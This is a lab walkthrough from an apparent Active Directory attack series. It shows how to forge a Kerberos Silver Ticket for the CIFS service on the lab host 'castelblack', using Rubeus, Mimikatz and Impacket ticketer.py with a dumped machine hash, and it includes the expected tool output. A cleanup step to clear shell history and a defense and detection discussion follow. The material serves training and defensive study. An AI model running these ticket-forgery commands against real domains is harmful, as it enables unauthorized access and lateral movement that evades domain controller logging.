# 08 — Silver Ticket (T1558.002)

Where a Golden Ticket forges a TGT signed by `krbtgt`, a Silver Ticket forges a *service ticket* (TGS) signed by the **service account's own key** — the machine account hash for a computer service like CIFS/HOST, or a service account hash for an application SPN. Because the target service decrypts and trusts the TGS locally using its own key and (by default) never calls back to the DC to validate the PAC, a Silver Ticket grants access to that one service **without any DC contact at all** — quieter than a Golden Ticket and invisible to KDC ticket-request logging. This walkthrough forges a CIFS service ticket for `castelblack` using its machine account hash (obtained via DCSync in attack 06), with both Rubeus on `braavos` and Mimikatz, then accesses `castelblack`'s file shares.

**MITRE ATT&CK Technique**: [T1558.002 — Steal or Forge Kerberos Tickets: Silver Ticket](https://attack.mitre.org/techniques/T1558/002/)

## Prerequisites
- The NT hash (or AES256 key) of the *service's* account. For the `CIFS/castelblack` SPN that is the `CASTELBLACK$` machine account hash, dumped via DCSync in attack 06: `5e8a1c4f6b2d9075c3e8a1f4b6d2c90e`. (For an application SPN you would use the cracked/dumped service-account hash, e.g. `svc_mssql` from attack 02.)
- The domain SID for `sevenkingdoms.local`: `S-1-5-21-1409811732-3669127061-1593309205`.
- Network access to the target service on `castelblack` (192.168.56.11, SMB/445) — but **no** access to the DC is required.

## Tools
- Rubeus v2.3.2 — run on `braavos` (192.168.56.14).
- Mimikatz 2.2.0 — run on `braavos` (192.168.56.14).
- Impacket v0.12.0 (`smbclient.py`, optional) — Linux attacker (192.168.56.1) to verify access from a separate host.

## Step-by-step Commands

### Step 1 — (braavos, 192.168.56.14) Gather the service hash and SID
The SPN we forge for is `CIFS/castelblack.sevenkingdoms.local`; its key is the `CASTELBLACK$` machine hash.
```powershell
# CASTELBLACK$ NTLM = 5e8a1c4f6b2d9075c3e8a1f4b6d2c90e   (from attack 06 DCSync)
# Domain SID        = S-1-5-21-1409811732-3669127061-1593309205
klist purge
```

### Step 2 — (braavos, 192.168.56.14) Forge the Silver Ticket with Rubeus
`/service` is the SPN; `/rc4` is the machine hash; `/ptt` injects the forged TGS directly. No TGT and no DC round-trip occur.
```powershell
cd C:\Tools\Rubeus
.\Rubeus.exe silver /service:CIFS/castelblack.sevenkingdoms.local ^
  /rc4:5e8a1c4f6b2d9075c3e8a1f4b6d2c90e ^
  /sid:S-1-5-21-1409811732-3669127061-1593309205 ^
  /user:hand_of_king /id:500 /groups:512,513,518,519,520 ^
  /domain:sevenkingdoms.local /ldap /ptt
```

![Step 1](../screenshots/attack-8-step-1.png)

### Step 3 — (braavos, 192.168.56.14) Alternative: forge with Mimikatz kerberos::golden /target
Mimikatz uses the same `golden` verb but `/service` + `/target` + the service key produce a TGS (Silver) rather than a TGT.
```powershell
cd C:\Tools\mimikatz\x64
.\mimikatz.exe
# inside mimikatz:
kerberos::golden /user:hand_of_king /domain:sevenkingdoms.local ^
  /sid:S-1-5-21-1409811732-3669127061-1593309205 ^
  /target:castelblack.sevenkingdoms.local /service:cifs ^
  /rc4:5e8a1c4f6b2d9075c3e8a1f4b6d2c90e ^
  /id:500 /groups:512 /ptt
exit
```

![Step 2](../screenshots/attack-8-step-2.png)

### Step 4 — (braavos, 192.168.56.14) Verify the forged TGS and access the service
`klist` shows a TGS for the CIFS SPN but **no** TGT — the hallmark of a Silver Ticket.
```powershell
klist
dir \\castelblack.sevenkingdoms.local\C$
```

![Step 3](../screenshots/attack-8-step-3.png)

### Step 5 — (Linux attacker, 192.168.56.1) Equivalent with Impacket ticketer.py (spn mode)
`-spn` forges a service ticket directly. Use `-nthash` of the machine account.
```bash
ticketer.py -nthash 5e8a1c4f6b2d9075c3e8a1f4b6d2c90e \
  -domain-sid S-1-5-21-1409811732-3669127061-1593309205 \
  -domain {{DOMAIN}} \
  -spn CIFS/castelblack.sevenkingdoms.local \
  -user-id 500 -groups 512 hand_of_king
export KRB5CCNAME=hand_of_king.ccache
smbclient.py -k -no-pass {{DOMAIN}}/hand_of_king@castelblack.sevenkingdoms.local
# {{DOMAIN}} = sevenkingdoms.local
```

![Step 4](../screenshots/attack-8-step-4.png)

## Expected Output

Rubeus `silver` (Step 2):
```text
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Build TGS

[*] Building PAC
[*] Domain         : SEVENKINGDOMS.LOCAL (SEVENKINGDOMS)
[*] SID            : S-1-5-21-1409811732-3669127061-1593309205
[*] UserId         : 500
[*] Groups         : 512,513,518,519,520
[*] ServiceKey     : 5E8A1C4F6B2D9075C3E8A1F4B6D2C90E
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] Service        : CIFS
[*] Target         : castelblack.sevenkingdoms.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'hand_of_king' to 'CIFS/castelblack.sevenkingdoms.local'

[+] Ticket successfully imported!
```

`klist` after injection (Step 4) — note: TGS only, no krbtgt TGT:
```text
Cached Tickets: (1)

#0>     Client: hand_of_king @ SEVENKINGDOMS.LOCAL
        Server: CIFS/castelblack.sevenkingdoms.local @ SEVENKINGDOMS.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 5/20/2026 9:31:18 (local)
        End Time:   5/20/2026 19:31:18 (local)
        Renew Time: 5/27/2026 9:31:18 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
```

`dir \\castelblack\C$` (Step 4) — access granted with no DC traffic:
```text
 Directory of \\castelblack.sevenkingdoms.local\C$

02/10/2026  08:40 AM    <DIR>          Program Files
02/10/2026  08:40 AM    <DIR>          Users
05/08/2026  03:25 PM    <DIR>          Windows
               0 File(s)              0 bytes
```

Impacket verification from Linux (Step 5):
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Using Kerberos Cache: hand_of_king.ccache
[*] Requesting shares on castelblack.sevenkingdoms.local.....
# shares
ADMIN$
C$
IPC$
```

## Cleanup Steps
- On `braavos`: `klist purge` to remove the forged TGS. Because the ticket never traversed the KDC, there is nothing on `kingslanding` or `castelblack` to clean up.
- On the Linux attacker: `unset KRB5CCNAME` and `rm -f hand_of_king.ccache`; clear shell history.
- No accounts or objects were modified. **Do not** reset the `CASTELBLACK$` machine account password — that would change its key, but is unnecessary for cleanup and would disrupt other walkthroughs.

## What This Tells You About AD
The Silver Ticket exposes a subtle trust boundary: a Kerberos service ticket is validated *by the service itself* using the service account's key, not by the DC. By default, member-server services do not perform PAC validation against the KDC for tickets they can already decrypt, so a forged TGS — signed with a stolen machine or service hash — is accepted as genuine, granting access to that single service with whatever PAC privileges the attacker wrote in. This is stealthier than a Golden Ticket precisely because **no AS-REQ or TGS-REQ ever reaches the DC** (Event IDs 4768/4769 are absent), so KDC-centric detection is blind; only the target host's own logon event (4624) and the service's access logs reveal the use. Defenses: rotate machine account passwords regularly (default 30 days — and ensure it actually happens), enable PAC validation where feasible, treat any dumped machine/service hash as a service-impersonation key, and rely on host-side detection (logons for SPN-bearing accounts with no preceding network authentication to a DC, RC4 service tickets where AES is expected). Fundamentally: protecting the DC alone is insufficient when every member server's machine hash is itself a forgeable service identity.

## Detection Reference
See [../detection/kql-queries.md#8-silver-ticket](../detection/kql-queries.md#8-silver-ticket) for the host-side forged-TGS signatures (member-server Event ID 4624 logons with no corresponding DC-side 4768/4769, service tickets using RC4 etype 0x17 against AES-capable hosts, and access to SPN services by principals with no recent interactive/network authentication to the KDC).

---
Last updated: 2026-05-17

MITRE references:
- [T1558.002 — Steal or Forge Kerberos Tickets: Silver Ticket](https://attack.mitre.org/techniques/T1558/002/)
- [TA0008 — Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [T1550.003 — Use Alternate Authentication Material: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
